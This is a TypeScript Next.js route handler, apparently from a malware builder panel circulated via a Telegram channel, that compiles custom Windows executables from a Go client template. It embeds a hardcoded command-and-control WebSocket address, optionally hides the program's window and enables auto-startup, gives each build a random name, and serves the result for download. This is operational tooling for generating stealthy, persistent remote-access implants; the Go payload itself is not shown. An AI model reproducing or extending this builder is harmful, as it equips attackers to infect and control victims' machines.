// t.me/SentinelLinks

import { NextResponse } from "next/server"
import { exec } from "child_process"
import { promisify } from "util"
import * as fs from "fs"
import * as path from "path"
import * as crypto from "crypto"

const execAsync = promisify(exec)

const SERVER_WS_URL = process.env.GROB_SERVER_URL || "ws://77.221.148.113:8765"

// t.me/SentinelLinks
function generateRandomName(): string {
  return crypto.randomBytes(8).toString("hex")
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const hideDesktopIcon = formData.get("hideDesktopIcon") === "true"
    const autoStartup = formData.get("autoStartup") === "true"
    const userUid = formData.get("userUid") as string

    if (!userUid || userUid === "null" || !userUid.trim()) {
      return NextResponse.json({ error: "UID is required", details: "Please re-login" }, { status: 400 })
    }

    const randomName = generateRandomName()
    const fileName = `client_${randomName}`

    const templatePath = path.join(process.cwd(), "client", "main.go")

    if (!fs.existsSync(templatePath)) {
      return NextResponse.json(
        { error: "Client template not found", details: "main.go is missing from /client folder" },
        { status: 500 },
      )
    }

    let clientCode = fs.readFileSync(templatePath, "utf-8")

    // Replace placeholders
    clientCode = clientCode.replace("{{SERVER_URL}}", SERVER_WS_URL)
    clientCode = clientCode.replace("{{USER_UID}}", userUid)
    clientCode = clientCode.replace("{{AUTO_STARTUP}}", autoStartup ? "true" : "false")
    clientCode = clientCode.replace("{{HIDDEN_MODE}}", hideDesktopIcon ? "true" : "false")

    const distTempDir = path.join(process.cwd(), "dist_temp")
    if (!fs.existsSync(distTempDir)) {
      fs.mkdirSync(distTempDir, { recursive: true })
    }

// t.me/SentinelLinks
    const tempDir = path.join(distTempDir, `build_${randomName}`)
    fs.mkdirSync(tempDir, { recursive: true })

    // Write modified source
    const sourceFile = path.join(tempDir, "main.go")
    fs.writeFileSync(sourceFile, clientCode)

    // Copy go.mod
    const goModPath = path.join(process.cwd(), "client", "go.mod")
    if (fs.existsSync(goModPath)) {
      fs.copyFileSync(goModPath, path.join(tempDir, "go.mod"))
    } else {
      return NextResponse.json(
        { error: "go.mod not found", details: "go.mod is missing from /client folder" },
        { status: 500 },
      )
    }

    // Copy go.sum if exists
    const goSumPath = path.join(process.cwd(), "client", "go.sum")
    if (fs.existsSync(goSumPath)) {
      fs.copyFileSync(goSumPath, path.join(tempDir, "go.sum"))
    }

// t.me/SentinelLinks
    // Check if Go is available
    try {
      await execAsync("go version")
    } catch {
      return NextResponse.json(
        {
          error: "Go not installed",
          details: "Install Go from https://go.dev/dl/",
        },
        { status: 500 },
      )
    }

    const outputExe = path.join(tempDir, `${fileName}.exe`)

    // Build flags
    const ldflags = hideDesktopIcon ? "-s -w -H windowsgui" : "-s -w"

    const buildEnv = {
      ...process.env,
      GOOS: "windows",
      GOARCH: "amd64",
      CGO_ENABLED: "0",
    }

    try {
      await execAsync(`go mod tidy`, {
        timeout: 120000,
        cwd: tempDir,
        env: buildEnv,
      })

      await execAsync(`go build -ldflags="${ldflags}" -o "${outputExe}" main.go`, {
        timeout: 180000,
        cwd: tempDir,
        env: buildEnv,
      })
    } catch (buildError: any) {
      // Cleanup on error
      try {
        fs.rmSync(tempDir, { recursive: true, force: true })
      } catch {}

      return NextResponse.json(
        {
          error: "Build failed",
          details: buildError.stderr || buildError.message || "Check Go installation",
        },
        { status: 500 },
      )
    }

    // Check if output exists
    if (!fs.existsSync(outputExe)) {
      try {
        fs.rmSync(tempDir, { recursive: true, force: true })
      } catch {}

      return NextResponse.json(
        {
          error: "EXE not found",
          details: "Build completed but output file is missing",
        },
        { status: 500 },
      )
    }

    // Read the built EXE
    const exeBuffer = fs.readFileSync(outputExe)

    // Cleanup temp directory
    try {
      fs.rmSync(tempDir, { recursive: true, force: true })
    } catch {
      // Silent cleanup error
    }

    return new NextResponse(exeBuffer, {
      status: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="${fileName}.exe"`,
        "Content-Length": exeBuffer.length.toString(),
      },
    })
  } catch (error: any) {
    return NextResponse.json(
      {
        error: "Build failed",
        details: error.message || "Unknown error",
      },
      { status: 500 },
    )
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
